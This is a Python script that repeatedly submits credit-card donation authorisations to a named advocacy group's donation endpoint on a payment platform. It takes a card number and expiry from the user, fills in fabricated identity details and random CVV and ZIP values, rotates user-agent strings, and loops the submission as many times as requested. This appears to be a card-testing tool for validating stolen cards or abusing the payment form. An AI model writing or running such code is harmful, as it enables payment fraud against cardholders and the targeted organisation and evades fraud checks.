import requests
import time
from random import choice
import os
import base64
import random

user_agents = [
    "Mozilla/5.0 (Linux; arm_64; Android 15; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.52 YaBrowser/25.6.6.52.00 SA/3 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10.4; X88pro10.q2.0.6330.d4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6825.65 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 CriOS/136.0.7103.425 YaBrowser/25.7.5.425.10 SA/3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 YaBrowser/25.7.5.425.10 SA/3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 8.0; STF-AL10 Build/HUAWEISTF-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/10.11 baiduboxapp/10.11.0.12 (Baidu; P1 8.0.0)",
    "Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.158 Mobile Safari/537.36",
]

def go(CardNumber, cardMonth: int, cardYear: int):
    encoded_CardNumber = base64.b64encode(str(CardNumber).encode()).decode()
    user_agent = choice(user_agents)

    firstName = 'Ahmed'
    lastName = 'muhamed'
    phone = '+12015456455'
    city = 'jsiokaca'
    country = 'US'
    line1 = 'ksikwimxw'
    postal_code = random.randint(10000, 99999)
    cardCode = random.randint(100, 999)
    cardZip = random.randint(10000, 99999)

    cookies = {
        '__cf_bm': 'P4uNp0NPxAw80MvEJRJ5dwclITKf5xvkqCkNhJDEfxs-1754053958-1.0.1.1-BFjdbC9jRlotdKW20v1RvT7yaFUGIQVvzAeC6sU3Lj1C.X1UynRZ6ycvnulhrujQHNWBV6c4ITp3xKJJdDPfhiBLMu9SWEYRSYYeXOSzQZ4',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'idempotency-key': '202a7e0f-9de1-4101-8790-e36876af71c0',
        'origin': 'https://donate.gunrights.org',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://donate.gunrights.org/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-storage-access': 'active',
        'user-agent': user_agent,
        'x-app': 'anedot:3',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'accountSlug': 'national-association-for-gun-rights',
        'actionPageSlug': 'donate',
        'email': 'ahmediskandrani52@gmail.com',
        'employerAddressAttributes': {
            'city': '',
            'country': '',
            'line1': '',
            'line2': '',
            'postalCode': '',
            'region': '',
        },
        'employerName': '',
        'firstName': firstName,
        'hasRestoredState': False,
        'lastName': lastName,
        'middleName': '',
        'occupation': '',
        'phone': phone,
        'promoCode': '',
        'referrerToForm': '',
        'suffix': '',
        'title': '',
        'totalPrice': 0,
        'addressAttributes': {
            'city': city,
            'country': country,
            'line1': line1,
            'line2': '',
            'postalCode': postal_code,
            'region': 'AK',
        },
        'communicationsConsentEmail': None,
        'communicationsConsentPhone': None,
        'currentlyEmployed': None,
        'customFieldResponsesAttributes': [
            {
                'customFieldId': 'b186d510-a5ed-45c3-bd88-24deb1d8028b',
                'data': 'website',
                'label': 'iteration',
                'position': 1,
            },
            {
                'customFieldId': 'a161bb7a-3e09-4904-b5d8-c944b2e2cfdb',
                'data': '1300',
                'label': 'campaign',
                'position': 2,
            },
            {
                'customFieldId': '68efdb59-2215-44f7-8409-b368f0503fed',
                'data': 'no_tag',
                'label': 'tag',
                'position': 3,
            },
            {
                'customFieldId': '1f7d274e-05ac-49c0-a7f8-4b241b8a89ed',
                'data': 'y',
                'label': 'utm_content',
                'position': 5,
            },
        ],
        'referrer': 'https://donate.gunrights.org/donate',
        'rumbleUpRequestId': None,
        'amountAllocationsAttributes': [
            {
                'actionPagesFundId': '89de3cae-f82f-45a8-8cb9-17e5537c660f',
                'amount': 1500,
                'fundType': 'direct',
            },
        ],
        'ddcSessionId': 'd3cb7f0d49614150b7fa693b997c6a1a',
        'submissionPaymentMethodAttributes': {
            'cardCode': cardCode,
            'cardMonth': cardMonth,
            'cardYear': cardYear,
            'cardZip': cardZip,
            'customerCoveredFees': False,
            'encryptedCardNumber': encoded_CardNumber,
            'type': 'SubmissionPaymentMethods::CreditCard',
        },
    }

    try:
        response = requests.post(
            'https://anedot.com/public/v3/submissions/donation_auth',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        if response.status_code == 200:
            print(f"Request was successful | user agent: {user_agent[:50]}...")
            # print(response.json())
        else:
            print(f"Request failed with status code: {response.status_code} | user agent: {user_agent[:50]}...")
            # print(response.text)
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    while True:
        CardNumber = input("Enter the CardNumber=> : ").strip()
        cardMonth = int(input("Enter the Month => : ").strip())
        cardYear = int(input("Enter the Year => : ").strip())
        num_for = int(input("How many times should we process the card? => : ").strip())

        print(f"Processing card: {CardNumber}")
        time.sleep(choice([2, 5, 4, 3, 5, 3]))

        for _ in range(num_for):
            go(CardNumber, cardMonth, cardYear)

        ee = input("Press Enter to continue or type 'e' to quit: ").strip().lower()

        os.system('cls' if os.name == 'nt' else 'clear')

        if ee == 'e':
            print("Exiting the program.")
            time.sleep(3)
            break

if __name__ == "__main__":
    main()
